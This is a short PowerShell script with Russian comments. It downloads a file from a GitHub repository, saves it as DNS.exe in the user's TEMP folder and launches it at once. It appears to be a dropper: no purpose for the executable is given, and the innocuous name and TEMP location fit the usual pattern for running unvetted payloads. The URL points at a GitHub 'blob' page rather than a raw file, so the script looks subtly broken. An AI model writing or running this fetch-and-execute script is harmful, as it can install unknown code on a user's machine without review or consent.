# Скачать файл
$url = 'https://github.com/FREAKMANCHIK/WORK/blob/main/files/DNS'
$outputPath = "$env:TEMP\DNS.exe"
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Запустить скачанный файл
Start-Process -FilePath $outputPath
